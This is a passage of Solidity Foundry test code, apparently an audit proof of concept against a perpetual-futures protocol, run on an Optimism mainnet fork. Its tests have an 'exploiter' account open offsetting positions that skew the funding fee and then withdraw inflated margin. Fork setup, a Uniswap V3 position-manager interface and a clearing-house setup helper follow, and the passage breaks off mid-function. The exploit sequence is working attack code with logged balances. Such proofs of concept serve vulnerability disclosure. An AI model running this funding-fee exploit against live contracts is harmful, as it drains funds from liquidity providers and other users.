marketId,\n                maker: address(oracle_maker),\n                isBaseToQuote: true,\n                isExactInput: true,\n                amount: 1000e18,\n                oppositeAmountBound:0,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n        int256 exploiterMargin = vault.getMargin(marketId, exploiter);\n        console.log(\"Exploiter's margin after both positions are closed: \");\n        console.logInt(exploiterMargin);\n\n        vm.startPrank(exploiter);\n\n        //At this point the exploiter could withdraw only part of the margin because there aren't enough collateral\n        int256 upDec = vault.getUnsettledPnl(marketId,address(exploiter));\n        int256 stDec = vault.getSettledMargin(marketId,address(exploiter));\n        int256 marg = stDec-upDec;\n        uint256 margAbs = marg.abs();\n        uint256 toWithdraw = margAbs.formatDecimals(INTERNAL_DECIMALS,collateralToken.decimals());\n\n        vault.transferMarginToFund(marketId,toWithdraw);\n        vault.withdraw(vault.getFund(exploiter));\n\n        vm.stopPrank();\n\n        uint256 finalQuoteBalance = collateralToken.balanceOf(address(exploiter));\n        //console.log(\"Exploiter balance using the available collateral at that momment: %s\", finalQuoteBalance);\n\n        //Simulates losses for a trader in order to demonstrate that the whole margin amount could be withdrawn if there is enough collateral\n        _deposit(marketId, address(oracle_maker), 3000000*1e6);\n\n        vm.startPrank(trader);\n\n        _mockPythPrice(5000,0);\n        clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(oracle_maker),\n                isBaseToQuote: false,\n                isExactInput: false,\n                amount: 1200 * 1e18,\n                oppositeAmountBound:type(uint256).max,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n            _mockPythPrice(3000,0);\n\n        clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(oracle_maker),\n                isBaseToQuote: true,\n                isExactInput: true,\n                amount: 1200 * 1e18,\n                oppositeAmountBound:0,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n        vm.startPrank(exploiter);\n\n        uint256 exploiterMarginAbs = exploiterMargin.abs().formatDecimals(INTERNAL_DECIMALS,collateralToken.decimals());\n\n        vault.transferMarginToFund(marketId, exploiterMarginAbs - toWithdraw);\n        vault.withdraw(vault.getFund(exploiter));\n\n        finalQuoteBalance = collateralToken.balanceOf(address(exploiter));\n        console.log(\"Exploiter Quote balance at End: %s\", finalQuoteBalance);\n    }\n\n    function testFundingFeeExploitAdditionalLiquidity() public \n    {\n        uint256 spotLpInitialBalance = 500000e6;\n        deal(address(collateralToken), spotLp, spotLpInitialBalance, false);\n        console.log(\"LP balance before the deposit to Uniswap %d\", collateralToken.balanceOf(spotLp));\n        uniPositionId = openUniswapV3Position(address(spotLp), spotLpInitialBalance);\n\n        //deposit 6M collateral as margin for exploiter (also mints the amount)\n        uint256 startQuote = 6000000*1e6;\n       _deposit(marketId, exploiter, startQuote);\n       _deposit(marketId, trader, 30000000e6);  \n\n        console.log(\"Exploiter Quote balance at Start: %s\\n\", startQuote);\n\n        //deposit to makers\n        //initial HSBM maker deposit: 2000 base tokens ($6M)\n       vm.startPrank(makerLp);\n       deal(address(baseToken2), makerLp, 2000*1e18, false);\n       baseToken2.approve(address(maker), type(uint256).max);\n       maker.deposit(2000*1e18);\n\n       //initial oracle maker deposit: $3M (1000 base tokens)\n       deal(address(collateralToken), makerLp, 3000000*1e6, false); \n       collateralToken.approve(address(oracle_maker), type(uint256).max);\n       oracle_maker.deposit(3000000*1e6);\n       vm.stopPrank();\n\n       //Also deposit collateral directly to SHBM to simulate some existing margin on the SHBM from previous activity\n       _deposit(marketId, address(maker), 3000000*1e6);\n\n       //Exploiter opens the maximum possible (-1000 base tokens) long on oracle maker\n        vm.startPrank(exploiter);\n        (int256 posBase, int256 openNotional) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(oracle_maker),\n                isBaseToQuote: false,\n                isExactInput: false,\n                amount: 1000*1e18,\n                oppositeAmountBound:type(uint256).max,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n        (posBase,openNotional) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(maker),\n                isBaseToQuote: true,\n                isExactInput: true,\n                amount: 2000 * 1e18,\n                oppositeAmountBound:0,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n        console.log(\"Funding Fee Rate after short:\");\n        int256 ffeeRate = fundingFee.getCurrentFundingRate(marketId);\n        console.logInt(ffeeRate);\n        \n        //move to next block\n        vm.warp(block.timestamp + 2 seconds);\n\n        //Exploiter closes the short to realize gains\n        clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(maker),\n                isBaseToQuote: false,\n                isExactInput: false,\n                amount: 2000 * 1e18,\n                oppositeAmountBound:type(uint256).max,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n        \n        //Exploiter closes the long position\n        clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(oracle_maker),\n                isBaseToQuote: true,\n                isExactInput: true,\n                amount: 1000e18,\n                oppositeAmountBound:0,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n        int256 exploiterMargin = vault.getMargin(marketId, exploiter);\n        console.log(\"Exploiter's margin after both positions are closed: \");\n        console.logInt(exploiterMargin);\n\n        closeUniswapV3Position(uniPositionId, spotLp);\n\n        vm.startPrank(exploiter);\n\n        //At this point the exploiter could withdraw only part of the margin because there aren't enough collateral\n        int256 upDec = vault.getUnsettledPnl(marketId,address(exploiter));\n        int256 stDec = vault.getSettledMargin(marketId,address(exploiter));\n        int256 marg = stDec-upDec;\n        uint256 margAbs = marg.abs();\n        uint256 toWithdraw = margAbs.formatDecimals(INTERNAL_DECIMALS,collateralToken.decimals());\n       \n        vault.transferMarginToFund(marketId,toWithdraw);\n        vault.withdraw(vault.getFund(exploiter));\n\n        vm.stopPrank();\n\n        uint256 finalQuoteBalance = collateralToken.balanceOf(address(exploiter));\n        //console.log(\"Exploiter balance using the available collateral at that momment: %s\", finalQuoteBalance);\n\n        //Simulates losses for a trader in order to demonstrate that the whole margin amount could be withdrawn if there is enough collateral\n        _deposit(marketId, address(oracle_maker), 3000000*1e6);\n\n        vm.startPrank(trader);\n\n        _mockPythPrice(5000,0);\n        clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(oracle_maker),\n                isBaseToQuote: false,\n                isExactInput: false,\n                amount: 1200 * 1e18,\n                oppositeAmountBound:type(uint256).max,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n         _mockPythPrice(3000,0);\n\n       clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(oracle_maker),\n                isBaseToQuote: true,\n                isExactInput: true,\n                amount: 1200 * 1e18,\n                oppositeAmountBound:0,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n        vm.startPrank(exploiter);\n\n        uint256 exploiterMarginAbs = exploiterMargin.abs().formatDecimals(INTERNAL_DECIMALS,collateralToken.decimals());\n\n        vault.transferMarginToFund(marketId, exploiterMarginAbs - toWithdraw);\n        vault.withdraw(vault.getFund(exploiter));\n\n        finalQuoteBalance = collateralToken.balanceOf(address(exploiter));\n        console.log(\"Exploiter Quote balance at End: %s\", finalQuoteBalance);\n        console.log(\"LP balance at End %d\", collateralToken.balanceOf(spotLp));\n    }\n}\n```\n\n```solidity\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity >=0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../clearingHouse/ClearingHouseIntSetup.sol\";\nimport { Vault } from \"../../src/vault/Vault.sol\";\nimport { SpotHedgeBaseMaker } from \"../../src/maker/SpotHedgeBaseMaker.sol\";\nimport { IUniswapV3Factory } from \"../../src/external/uniswap-v3-core/contracts/interfaces/IUniswapV3Factory.sol\";\nimport { IUniswapV3PoolActions } from \"../../src/external/uniswap-v3-core/contracts/interfaces/pool/IUniswapV3PoolActions.sol\";\nimport { IUniswapV3PoolImmutables } from \"../../src/external/uniswap-v3-core/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol\";\nimport { ISwapRouter } from \"../../src/external/uniswap-v3-periphery/contracts/interfaces/ISwapRouter.sol\";\nimport { IQuoter } from \"../../src/external/uniswap-v3-periphery/contracts/interfaces/IQuoter.sol\";\nimport { TestCustomDecimalsToken } from \"../helper/TestCustomDecimalsToken.sol\";\nimport { TestWETH9 } from \"../helper/TestWETH9.sol\";\nimport { INonfungiblePositionManager } from \"./INonfungiblePositionManager.sol\";\nimport { IPythOracleAdapter } from \"../../src/oracle/pythOracleAdapter/IPythOracleAdapter.sol\";\n\nimport { IERC20 } from \"../../lib/forge-std/src/interfaces/IERC20.sol\";\n\ncontract SpotHedgeBaseMakerForkSetup2 is ClearingHouseIntSetup {\n    //uint256 forkBlock = 105_302_472; // Optimiam mainnet @ Thu Jun  8 05:55:21 UTC 2023\n    uint256 forkBlock = 119_532_497;\n\n    address public makerLp = makeAddr(\"MakerLP\");\n    address public spotLp = makeAddr(\"SpotLP\");\n\n    string public name = \"SHBMName\";\n    string public symbol = \"SHBMSymbol\";\n    TestWETH9 public weth;\n    TestCustomDecimalsToken public baseToken;\n\n    // Optimism Mainnet\n    ISwapRouter public uniswapV3Router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // Uniswap v3 Swap Router v1 @ Optimism Mainnet\n    IUniswapV3Factory public uniswapV3Factory = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984); // Uniswap v3 Factory @ Optimism Mainnet\n    IQuoter public uniswapV3Quoter = IQuoter(0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6); // Uniswap v3 Quoter v1 @ Optimism Mainnet\n    INonfungiblePositionManager public uniswapV3NonfungiblePositionManager =\n        INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);\n\n    bytes public uniswapV3B2QPath;\n    bytes public uniswapV3Q2BPath;\n    address public uniswapV3SpotPool;\n\n    bytes public priceUpdateData =\n        hex\"01000000030d00c2dfc7626e7076b83f19fc5bca281d3c241729ef369b135e3081afcacf856c696fdae82a2b1ed4ddfc14a667d6a7348ab8c6f2fdf0becc4e0577e37b71b73fe50101b438a63525b8f5d54b3947cc0404073f53cc24ea852fcbd2d56a1591c4f3e30456da37ded2cfb57f896b2f96444cae02838a70575cfbc102e600b070afa9e27d000265cdfbbc26cd8c5a1dceb5caba526bacd706a523ef961bae56a7f45d572e2e22499d0f920267b053545cb4e7c441dd3129d671ef494a7208e9c3134944539bde0004f5c1588e839c930bdc4d2e7c7e6b6bc659b0f2a4a0ad5d7f12140170ec7e32630f87424945880dae481005be935c8a479add63711c452937ae278ff68bd23d5a0106b9bc81d31511a03ab4f36e9fe5d9b8dd95be083967fad01c0174b960185959cc4da89357995efd6c29fd94d4c54e581ee52349ba14e7d1901b82a250b008d8f700095fae6f46953a46d1556b1400f4afc899bdf522a6396b9833cbe864da6a614c8e3cf109c651d896a48ce94159f1f5e6c37937cefb1032489223dc7b3c6c0df40f010a8af3499aadd61ddfaa0ec4abb9a08a12edce8fc54837b90c68344dcba1cf9b2442208e11b79f77cab15a6fa0901b8bb5ee99e653190e17695afdb8dba452ae03010ba0c63e50c205d5d87e218521673d7944b94f5a06dc6925ea726d25876a9c24cc753eb5abc2f932a67f5884f705ba03c66745b0aad1f6d04a455f76e826394e40010d0486e73d19b5e55144ad08cee2337185eba4e79353528a9bb42b922aa1d5e8be5f197a74ab06064bbf9a4e0c4c1c9b658f75d81d36c546c3caa73d1e2eac0570010e93816517a08ed4ceb404c41f56c1a0ab769667d6a023d71e4057697dbcd475f159a54ce7a80fdeec8e3f0bea5cb8767648514ba801ec55fc4724d0f96531ed15000f8ce5c6b4cb93dfbad4336ab270dc3365d8903bf340687c08be5230461011974325afe1e02042b64f48c9beae8c4854f7b12569184fa4c9e445506bd3a13871b20011f46645418821afbf7bf69e95cc07c80f1b5d254b8e561d04ce88f08e8719161d7258c8e30ce3cbae425516f4a60c30cb9313dd0545e385911a601461e03d90500012e31a8e7fbd8a81c8f1e8a2b1a6f743b8a901fc7bdc2b486aa9f2d15c300d16f938028165aca84b5bc01e63409ef80335aa2569484590d4c7e2f9a987e61a67f90164816d4500000000001af8cd23c2ab91237730770bbea08d61005cdda0984348f3f6eecb559638c0bba0000000001b85a2b50150325748000300010001020005009d04028fba493a357ecde648d51375a445ce1cb9681da1ea11e562b53522a5d3877f981f906d7cfe93f618804f1de89e0199ead306edc022d3230b3e8305f391b00000002a9e84375f000000000e7a7d61fffffff80000002aa6a23250000000000e3b3f37010000000a0000000c0000000064816d450000000064816d450000000064816d440000002a9e84375f000000000e7a7d610000000064816d44e6c020c1a15366b779a8c870e065023657c88c82b82d58a9fe856896a4034b0415ecddd26d49e1a8f1de9376ebebc03916ede873447c1255d2d5891b92ce57170000002c572b0c400000000009a7ec80fffffff80000002c5f098748000000000a0579370100000007000000080000000064816d450000000064816d450000000064816d440000002c57236b200000000009a04b600000000064816d44c67940be40e0cc7ffaa1acb08ee3fab30955a197da1ec297ab133d4d43d86ee6ff61491a931112ddf1bd8147cd1b641375f79f5825126d665480874634fd0ace0000002ac38a57d00000000004d9a8adfffffff80000002acd333e5000000000045471570100000018000000200000000064816d450000000064816d450000000064816d440000002ac38a57d00000000004d9a8ad0000000064816d448d7c0971128e8a4764e757dedb32243ed799571706af3a68ab6a75479ea524ff846ae1bdb6300b817cee5fdee2a6da192775030db5615b94a465f53bd40850b50000002abcc96d4c000000000bc27de1fffffff80000002ac30d8e800000000014a8c71c01000000080000000a0000000064816d450000000064816d450000000064816d440000002abcc96d4c000000000bc27de10000000064816d44543b71a4c292744d3fcf814a2ccda6f7c00f283d457f83aa73c41e9defae034ba0255134973f4fdf2f8f7808354274a3b1ebc6ee438be898d045e8b56ba1fe1300000000000000000000000000000000fffffff8000000000000000000000000000000000000000000000000080000000064816d450000000064816d410000000000000000000000000000000000000000000000000000000000000000\";\n\n    SpotHedgeBaseMaker public maker;\n    ERC20 baseToken2;\n     address token0 = 0x4200000000000000000000000000000000000006;\n        address token1 = 0x7F5c764cBc14f9669B88837ca1490cCa17c31607;\n\n    function setUp() public virtual override {\n        vm.label(address(uniswapV3Router), \"UniswapV3Router\");\n        vm.label(address(uniswapV3Factory), \"UniswapV3Factory\");\n        vm.label(address(uniswapV3Quoter), \"UniswapV3Quoter\");\n        vm.label(address(uniswapV3NonfungiblePositionManager), \"UniswapV3NonfungiblePositionManager\");\n        vm.createSelectFork(vm.rpcUrl(\"optimism\"), forkBlock);\n\n        collateralToken =  ERC20(token1);\n        baseToken2 = ERC20(token0);\n\n        ClearingHouseIntSetup.setUp();\n        _setCollateralTokenAsCustomDecimalsToken(6);\n        vm.label(address(collateralToken), collateralToken.symbol());\n\n        // disable borrwoing fee\n        config.setMaxBorrowingFeeRate(marketId, 0, 0);\n\n        // use forkPyth\n        _deployPythOracleAdaptorInFork();\n\n        uint24 spotPoolFee = 500;\n\n        uniswapV3B2QPath = abi.encodePacked(address(token0), uint24(spotPoolFee), address(token1));\n\n        uniswapV3Q2BPath = abi.encodePacked(address(token1), uint24(spotPoolFee), address(token0));\n\n        deal(address(token0), spotLp, 100e18, false);\n        deal(address(token1), spotLp, 200000e6, false);\n\n        //\n        // Provision the maker\n        //\n\n        config.createMarket(marketId, priceFeedId);\n        maker = new SpotHedgeBaseMaker();\n        _enableInitialize(address(maker));\n        maker.initialize(\n            marketId,\n            name,\n            symbol,\n            address(addressManager),\n            address(uniswapV3Router),\n            address(uniswapV3Factory),\n            address(uniswapV3Quoter),\n            address(token0),\n            // since margin ratio=accValue/openNotional instead of posValue, it can't maintain 1.0 most of the time\n            // even when spotHedge always do 1x long\n            0.5 ether\n        );\n        config.registerMaker(marketId, address(maker));\n\n        maker.setUniswapV3Path(address(token0), address(token1), uniswapV3B2QPath);\n        maker.setUniswapV3Path(address(token1), address(token0), uniswapV3Q2BPath);\n\n        //console.log(address(maker.quoteToken()));\n        //console.log(address(maker.baseToken()));\n\n        deal(address(token0), address(makerLp), 1e18, false);\n        vm.startPrank(makerLp);\n\n        IERC20(token0).approve(address(maker), type(uint256).max);\n       \n        maker.deposit(1e18);\n        vm.stopPrank();\n    }\n\n    function test_excludeFromCoverageReport() public override {\n        // workaround: https://github.com/foundry-rs/foundry/issues/2988#issuecomment-1437784542\n    }\n}\n```\n\n```solidity\n// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity >=0.8.0;\npragma abicoder v2;\n\n/// @title Non-fungible token for positions\n/// @notice Wraps Uniswap V3 positions in a non-fungible token interface which allows for them to be transferred\n/// and authorized.\ninterface INonfungiblePositionManager\n{\n    struct MintParams {\n        address token0;\n        address token1;\n        uint24 fee;\n        int24 tickLower;\n        int24 tickUpper;\n        uint256 amount0Desired;\n        uint256 amount1Desired;\n        uint256 amount0Min;\n        uint256 amount1Min;\n        address recipient;\n        uint256 deadline;\n    }\n\n     struct CollectParams {\n        uint256 tokenId;\n        address recipient;\n        uint128 amount0Max;\n        uint128 amount1Max;\n    }\n\n    /// @notice Collects up to a maximum amount of fees owed to a specific position to the recipient\n    /// @param params tokenId The ID of the NFT for which tokens are being collected,\n    /// recipient The account that should receive the tokens,\n    /// amount0Max The maximum amount of token0 to collect,\n    /// amount1Max The maximum amount of token1 to collect\n    /// @return amount0 The amount of fees collected in token0\n    /// @return amount1 The amount of fees collected in token1\n    function collect(CollectParams calldata params) external payable returns (uint256 amount0, uint256 amount1);\n\n    /// @notice Creates a new position wrapped in a NFT\n    /// @dev Call this when the pool does exist and is initialized. Note that if the pool is created but not initialized\n    /// a method does not exist, i.e. the pool is assumed to be initialized.\n    /// @param params The params necessary to mint a position, encoded as `MintParams` in calldata\n    /// @return tokenId The ID of the token that represents the minted position\n    /// @return liquidity The amount of liquidity for this position\n    /// @return amount0 The amount of token0\n    /// @return amount1 The amount of token1\n    function mint(MintParams calldata params)\n        external\n        payable\n        returns (\n            uint256 tokenId,\n            uint128 liquidity,\n            uint256 amount0,\n            uint256 amount1\n        );\n    \n    /// @notice Burns a token ID, which deletes it from the NFT contract. The token must have 0 liquidity and all tokens\n    /// must be collected first.\n    /// @param tokenId The ID of the token that is being burned\n    function burn(uint256 tokenId) external payable;\n\n     struct DecreaseLiquidityParams {\n        uint256 tokenId;\n        uint128 liquidity;\n        uint256 amount0Min;\n        uint256 amount1Min;\n        uint256 deadline;\n    }\n\n    /// @notice Decreases the amount of liquidity in a position and accounts it to the position\n    /// @param params tokenId The ID of the token for which liquidity is being decreased,\n    /// amount The amount by which liquidity will be decreased,\n    /// amount0Min The minimum amount of token0 that should be accounted for the burned liquidity,\n    /// amount1Min The minimum amount of token1 that should be accounted for the burned liquidity,\n    /// deadline The time by which the transaction must be included to effect the change\n    /// @return amount0 The amount of token0 accounted to the position's tokens owed\n    /// @return amount1 The amount of token1 accounted to the position's tokens owed\n    function decreaseLiquidity(DecreaseLiquidityParams calldata params)\n        external\n        payable\n        returns (uint256 amount0, uint256 amount1);\n\n            /// @notice Returns the position information associated with a given token ID.\n    /// @dev Throws if the token ID is not valid.\n    /// @param tokenId The ID of the token that represents the position\n    /// @return nonce The nonce for permits\n    /// @return operator The address that is approved for spending\n    /// @return token0 The address of the token0 for a specific pool\n    /// @return token1 The address of the token1 for a specific pool\n    /// @return fee The fee associated with the pool\n    /// @return tickLower The lower end of the tick range for the position\n    /// @return tickUpper The higher end of the tick range for the position\n    /// @return liquidity The liquidity of the position\n    /// @return feeGrowthInside0LastX128 The fee growth of token0 as of the last action on the individual position\n    /// @return feeGrowthInside1LastX128 The fee growth of token1 as of the last action on the individual position\n    /// @return tokensOwed0 The uncollected amount of token0 owed to the position as of the last computation\n    /// @return tokensOwed1 The uncollected amount of token1 owed to the position as of the last computation\n    function positions(uint256 tokenId)\n        external\n        view\n        returns (\n            uint96 nonce,\n            address operator,\n            address token0,\n            address token1,\n            uint24 fee,\n            int24 tickLower,\n            int24 tickUpper,\n            uint128 liquidity,\n            uint256 feeGrowthInside0LastX128,\n            uint256 feeGrowthInside1LastX128,\n            uint128 tokensOwed0,\n            uint128 tokensOwed1\n        );\n}\n```\n\n```solidity\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity >=0.8.0;\n\nimport \"../BaseTest.sol\";\nimport \"../../src/clearingHouse/ClearingHouse.sol\";\nimport \"../../src/vault/IPositionModelEvent.sol\";\nimport { FixedPointMathLib } from \"solady/src/utils/FixedPointMathLib.sol\";\nimport { ERC20 } from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport { IPyth } from \"pyth-sdk-solidity/IPyth.sol\";\nimport { PythStructs } from \"pyth-sdk-solidity/PythStructs.sol\";\nimport { AbstractPyth } from \"pyth-sdk-solidity/AbstractPyth.sol\";\nimport { MulticallerWithSender } from \"multicaller/MulticallerWithSender.sol\";\nimport { AddressManager } from \"../../src/addressManager/AddressManager.sol\";\nimport { Config } from \"../../src/config/Config.sol\";\nimport { SystemStatus } from \"../../src/systemStatus/SystemStatus.sol\";\nimport { Vault } from \"../../src/vault/Vault.sol\";\nimport { FundingFee } from \"../../src/fundingFee/FundingFee.sol\";\nimport { TestBorrowingFee } from \"../helper/TestBorrowingFee.sol\";\nimport { TestMaker } from \"../helper/TestMaker.sol\";\nimport { TestDeflationaryToken } from \"../helper/TestDeflationaryToken.sol\";\nimport { TestCustomDecimalsToken } from \"../helper/TestCustomDecimalsToken.sol\";\nimport { PythOracleAdapter } from \"../../src/oracle/pythOracleAdapter/PythOracleAdapter.sol\";\nimport { MakerReporter } from \"../../src/makerReporter/MakerReporter.sol\";\n\naddress constant MULTICALLER_WITH_SENDER = 0x00000000002Fd5Aeb385D324B580FCa7c83823A0;\n\ncontract ClearingHouseIntSetup is BaseTest {\n    using FixedPointMathLib for int256;\n\n    uint256 marketId = 0;\n    ERC20 public collateralToken;\n    TestDeflationaryToken public deflationaryCollateralToken;\n    Vault public vault;\n    ClearingHouse public clearingHouse;\n    Config public config;\n    SystemStatus public systemStatus;\n    TestBorrowingFee public borrowingFee;\n    FundingFee public fundingFee;\n    IPyth public pyth = IPyth(makeAddr(\"Pyth\"));\n    bytes32 public priceFeedId = 0xff61491a931112ddf1bd8147cd1b641375f79f5825126d665480874634fd0ace;\n    PythOracleAdapter public pythOracleAdapter;\n    AddressManager public addressManager;\n    MulticallerWithSender public multicallerWithSender = MulticallerWithSender(payable(MULTICALLER_WITH_SENDER));\n    MakerReporter public makerUtilRatioReporter;\n\n    function setUp() public virtual {\n        // external contact\n        deflationaryCollateralToken = new TestDeflationaryToken(\"DF-USDC\", \"DF-USDC\");\n        //collateralToken = ERC20(new TestCustomDecimalsToken(\"USDC\", \"USDC\", 6));\n        collateralToken = ERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);\n        vm.label(address(collateralToken), collateralToken.symbol());\n\n        // core contract\n        addressManager = new AddressManager();\n\n        vault = new Vault();\n        _enableInitialize(address(vault));\n        vault.initialize(address(addressManager), address(collateralToken));\n\n        clearingHouse = new ClearingHouse();\n        _enableInitialize(address(clearingHouse));\n        clearingHouse.initialize(address(addressManager));\n\n        config = new Config();\n        _enableInitialize(address(config));\n        config.initialize(address(addressManager));\n        config.setMaxOrderValidDuration(3 minutes);\n        config.setInitialMarginRatio(marketId, 0.1e18); // 10%\n        config.setMaintenanceMarginRatio(marketId, 0.0625e18); // 6.25%\n        config.setLiquidationFeeRatio(marketId, 0.5e18); // 50%\n        config.setLiquidationPenaltyRatio(marketId, 0.025e18); // 2.5%\n        config.setDepositCap(type(uint256).max); // allow maximum deposit\n\n        systemStatus = new SystemStatus();\n        _enableInitialize(address(systemStatus));\n        systemStatus.initialize();\n\n        borrowingFee = new TestBorrowingFee();\n        _enableInitialize(address(borrowingFee));\n        borrowingFee.initialize(address(addressManager));\n\n        fundingFee = new FundingFee();\n        _enableInitialize(address(fundingFee));\n        fundingFee.initialize(address(addressManager));\n\n        pythOracleAdapter = new PythOracleAdapter(address(pyth));\n\n        makerUtilRatioReporter = new MakerReporter();\n        _enableInitialize(address(makerUtilRatioReporter));\n        makerUtilRatioReporter.initialize(address(addressManager));\n\n        // Deposit oracle fee\n        pythOracleAdapter.depositOracleFee{ value: 1 ether }();\n\n        // copy bytecode to MULTICALLER_WITH_SENDER and initialize the slot 0(reentrancy lock) for it\n        vm.etch(MULTICALLER_WITH_SENDER, address(new MulticallerWithSender()).code);\n        vm.store(MULTICALLER_WITH_SENDER, bytes32(uint256(0)), bytes32(uint256(1 << 160)));\n\n        vm.mockCall(\n            address(pyth),\n            abi.encodeWithSelector(AbstractPyth.priceFeedExists.selector, priceFeedId),\n            abi.encode(true)\n        );\n\n        addressManager.setAddress(VAULT, address(vault));\n        addressManager.setAddress(CLEARING_HOUSE, address(clearingHouse));\n        addressManager.setAddress(BORROWING_FEE, address(borrowingFee));\n        addressManager.setAddress(FUNDING_FEE, address(fundingFee));\n        addressManager.setAddress(PYTH_ORACLE_ADAPTER, address(pythOracleAdapter));\n        addressManager.setAddress(MAKER_REPORTER, address(makerUtilRatioReporter));\n        addressManager.setAddress(CONFIG, address(config));\n        addressManager.setAddress(SYSTEM_STATUS, address(systemStatus));\n    }\n\n    // function test_PrintMarketSlotIds() public {\n    //     // Vault._statMap starts from slot 201 (find slot number in .openzeppelin/xxx.json)\n    //     for (uint i = 0; i < 101; i++) {\n    //         bytes32 slot = keccak256(abi.encode(0 + i, uint(201)));\n    //         console.log(uint256(slot));\n    //     }\n    // }\n\n    function test_excludeFromCoverageReport() public virtual override {\n        // workaround: https://github.com/foundry-rs/foundry/issues/2988#issuecomment-1437784542\n    }\n\n    function _setCollateralTokenAsDeflationaryToken() internal {\n        vault = new Vault();\n        _enableInitialize(address(vault));\n        vault.initialize(address(addressManager), address(deflationaryCollateralToken));\n        addressManager.setAddress(VAULT, address(vault));\n    }\n\n    function _setCollateralTokenAsCustomDecimalsToken(uint8 decimal) internal {\n        vault = new Vault();\n        _enableInitialize(address(vault));\n        //collateralToken = ERC20(new TestCustomDecimalsToken(\"USDC\", \"USDC\", decimal));\n        vm.label(address(collateralToken), collateralToken.symbol());\n        vault.initialize(address(addressManager), address(collateralToken));\n        addressManager.setAddress(VAULT, address(vault));\n    }\n\n    // ex: 1234.56 => price: 123456, expo = -2\n    function _mockPythPrice(int64 price, int32 expo) internal {\n        PythStructs.Price memory basePythPrice = PythStructs.Price(price, 0, expo, block.timestamp);\n\n        vm.mockCall(\n            address(pyth),\n            abi.encodeWithSelector(IPyth.getPriceNoOlderThan.selector, priceFeedId),\n            abi.encode(basePythPrice)\n        );\n    }\n\n    function _mockPythPrice(int64 price, int32 expo, uint256 timestamp) internal {\n        PythStructs.Price memory basePythPrice = PythStructs.Price(price, 0, expo, timestamp);\n\n        vm.mockCall(\n            address(pyth),\n            abi.encodeWithSelector(IPyth.getPriceNoOlderThan.selector, priceFeedId),\n            abi.encode(basePythPrice)\n        );\n    }\n\n    // deposit to funding account and transfer to market account\n    function _deposit(uint256 _marketId, address trader, uint256 amount) internal {\n        deal(address(collateralToken), trader, amount, true);\n        vm.startPrank(trader);\n        // only approve when needed to prevent disturbing asserting on the next clearingHouse.deposit call\n        if (collateralToken.allowance(trader, address(vault)) < amount) {\n            collateralToken.approve(address(vault), type(uint256).max);\n        }\n\n        // use multicall so that we can have vm.expecttraderabove the _deposit() call\n        address[] memory targets = new address[](2);\n        targets[0] = address(vault);\n        targets[1] = address(vault);\n\n        bytes[] memory data = new bytes[](2);\n        data[0] = abi.encodeWithSelector(vault.deposit.selector, trader, amount);\n        data[1] = abi.encodeWithSignature(\"transferFundToMargin(uint256,uint256)\", _marketId, amount);\n\n        uint256[] memory values = new uint256[](2);\n        values[0] = 0;\n        values[1] = 0;\n\n        multicallerWithSender.aggregateWithSender(targets, data, values);\n        vm.stopPrank();\n    }\n\n    // deposit to funding account\n    function _deposit(address trader, uint256 amount) internal {\n        deal(address(collateralToken), trader, amount, true);\n        vm.startPrank(trader);\n        // only approve when needed to prevent disturbing asserting on the next clearingHouse.deposit call\n        if (collateralToken.allowance(trader, address(vault)) < amount) {\n            collateralToken.approve(address(vault), type(uint256).max);\n        }\n        vault.deposit(trader, amount);\n        vm.stopPrank();\n    }\n\n    function _newMarketWithTestMaker(uint256 marketId_) internal returns (TestMaker maker) {\n        maker = new TestMaker(vault);\n        _newMarket(marketId_);\n        config.registerMaker(marketId_, address(maker));\n        return maker;\n    }\n\n    function _newMarket(uint256 marketId_) internal {\n        if (config.getPriceFeedId(marketId_) == 0x0) {\n            config.createMarket(marketId_, priceFeedId);\n        }\n    }\n\n    function _deployPythOracleAdaptorInFork() internal {\n        // use Optimism pyth contract address\n        pythOracleAdapter = new PythOracleAdapter(0xff1a0f4744e8582DF1aE09D5611b887B6a12925C);\n        // Deposit oracle fee\n        pythOracleAdapter.depositOracleFee{ value: 1 ether }();\n        addressManager.setAddress(PYTH_ORACLE_ADAPTER, address(pythOracleAdapter));\n    }\n\n    function _trade(address trader_, address maker_, int256 size, uint256 priceInEther) internal {\n        _tradeWithRelayFee(marketId, trader_, maker_, size, priceInEther, makeAddr(\"relayer\"), 0, 0);\n    }\n\n    function _tradeWithRelayFee(\n        uint256 marketId_,\n        address trader_,\n        address maker_,\n        int256 size_,\n        uint256 priceInEther, // when priceInEther = 1, it means 1 ether\n        address relayer,\n        uint256 takerRelayFee,\n        uint256 makerRelayFee\n    ) internal {\n        // workaround when we have hard coded whitelisted auth\n        vm.mockCall(\n            address(addressManager),\n            abi.encodeWithSelector(AddressManager.getAddress.selector, 